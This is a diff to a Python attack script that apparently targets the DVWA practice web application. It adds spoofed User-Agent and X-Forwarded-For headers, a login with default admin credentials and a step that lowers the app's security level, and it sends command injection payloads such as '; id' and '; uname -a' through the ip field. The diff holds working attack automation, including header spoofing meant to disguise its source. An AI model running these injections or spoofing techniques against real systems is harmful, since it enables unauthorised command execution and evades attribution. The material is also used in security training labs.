@@ -24,9 +24,36 @@ delay = delays.get(request_rate, 'medium')
 
 exec_url = f"{base_url}/vulnerabilities/exec/"
 
+# Headers to spoof User-Agent and IP address
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'X-Forwarded-For': '192.168.1.1'
+}
+# Construct the target URL for brute force attacks
+target_url = f"{base_url}/vulnerabilities/brute/"
+login_url = f"{base_url}/login.php"
+security_url = f"{base_url}/security.php"
+
 def login_and_setup_security():
-    # Existing login logic here
-    pass
+    #response = session.get(login_url)
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'Login': 'Login',
+    }
+    response = session.post(login_url, data=data, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+    time.sleep(delay) 
+    
+    #response = session.get(security_url)
+    data = {
+        'security': 'low',
+        'seclev_submit': 'Submit',
+        'user_token': user_token
+    }
+    session.post(security_url, data=data, headers=headers)
+    time.sleep(delay) 
 
 def command_injection_attack():
     commands = ["; id", "; uname -a","; pwd", "&& ls"]
@@ -37,7 +64,7 @@ def command_injection_attack():
 
     for command in commands:
         data = {'ip': '127.0.0.1' + command, 'Submit': 'Submit'}
-        response = session.post(exec_url, data=data)
+        response = session.post(exec_url, data=data, headers=headers)
         total_tests += 1
 
         if 200 <= response.status_code < 300:
